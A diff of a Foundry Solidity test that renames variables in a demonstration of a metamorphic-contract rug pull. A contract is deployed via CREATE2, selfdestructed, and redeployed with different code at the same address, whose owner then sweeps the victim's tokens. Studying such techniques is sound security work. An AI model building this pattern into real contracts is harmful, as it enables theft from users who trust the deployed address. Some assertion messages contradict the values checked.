@@ -3,47 +3,47 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 
-import {MetamorphicFactory} from "../../src/metamorphic/MetamorphicFactory.sol";
+import {Factory} from "../../src/metamorphic/Factory.sol";
 import {Multiplier} from "../../src/metamorphic/Multiplier.sol";
 import {Multiplier2} from "../../src/metamorphic/Multiplier2.sol";
 import {Destroy} from "../../src/metamorphic/Destroy.sol";
 import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
 
 contract MultiplerRug is Test {
-    ERC20 public weth;
+    ERC20 public rewardToken;
     Multiplier public multiplier;
-    MetamorphicFactory public factoryContract;
+    Factory public factoryContract;
     address public multiplierAddr;
     uint256 give = 1 ether;
     address user = address(1234);
 
     function setUp() public {
         // Create factory contract and prepare multisig bytecode for deployment
-		factoryContract = new MetamorphicFactory();
+		factoryContract = new Factory();
         bytes memory bytecode = abi.encodePacked(vm.getCode("Multiplier.sol"));
 
 		// deploy contract bytecode using create2
         multiplierAddr = factoryContract.deploy(1, bytecode);
         multiplier = Multiplier(multiplierAddr);
-        weth = new ERC20("Wrapped Ether", "WETH");
-        multiplier.init(address(weth), 2);
+        rewardToken = new ERC20("Wrapped Ether", "rewardToken");
+        multiplier.init(address(rewardToken), 2);
 
         uint256 multiplied = give * multiplier.multiplier();
-        deal(multiplier.weth(), user, give);
+        deal(multiplier.rewardToken(), user, give);
         
         // Never make assertions in the setUp function. Failed assertions won't result with failed test.
         // But if the test fails, failed assert will be visible
         // https://book.getfoundry.sh/tutorials/best-practices?highlight=setup#general-test-guidance
-        assertEq(weth.balanceOf(user), give);
+        assertEq(rewardToken.balanceOf(user), give);
 
-        deal(multiplier.weth(), multiplierAddr, multiplied);
+        deal(multiplier.rewardToken(), multiplierAddr, multiplied);
         vm.prank(user);
-        weth.approve(multiplierAddr, multiplied + 1);
+        rewardToken.approve(multiplierAddr, multiplied + 1);
         vm.prank(user);
         Multiplier(multiplierAddr).multiply(give);
 
-        assertEq(weth.balanceOf(user), multiplied);
-        assertEq(weth.balanceOf(multiplierAddr), give);
+        assertEq(rewardToken.balanceOf(user), multiplied);
+        assertEq(rewardToken.balanceOf(multiplierAddr), give);
 
         // The selfdestruct call must be done in setUp() due to a foundry limitation: https://github.com/foundry-rs/foundry/issues/1543
         address destroyAddr = address(new Destroy());
@@ -59,20 +59,20 @@ contract MultiplerRug is Test {
         assertEq(newMultiplierAddr, multiplierAddr);
         address owner = address(0x999);
         vm.prank(owner);
-        Multiplier2(newMultiplierAddr).init(address(weth), 2);
+        Multiplier2(newMultiplierAddr).init(address(rewardToken), 2);
 
         // confirm that the new multisig has the no balance
-        assertEq(weth.balanceOf(address(newMultiplierAddr)), give, "newMultiplierAddr balance should be 0");
+        assertEq(rewardToken.balanceOf(address(newMultiplierAddr)), give, "newMultiplierAddr balance should be 0");
         // confirm that the user has multiplied balance
-        assertEq(weth.balanceOf(address(user)), give * multiplier.multiplier(), "user balance should be multiplied");
+        assertEq(rewardToken.balanceOf(address(user)), give * multiplier.multiplier(), "user balance should be multiplied");
 
         // drain the funds from user wallet
         vm.prank(owner);
         Multiplier2(newMultiplierAddr).sweep(address(user));
         // confirm that the user has the no balance
-        assertEq(weth.balanceOf(address(user)), give - 1, "!user balance");
+        assertEq(rewardToken.balanceOf(address(user)), give - 1, "!user balance");
         // confirm the contract sweep user balance
-        assertEq(weth.balanceOf(address(owner)), give + 1, "owner balance should be multiplied");
+        assertEq(rewardToken.balanceOf(address(owner)), give + 1, "owner balance should be multiplied");
     }
 
     function testTheSameContract() public {
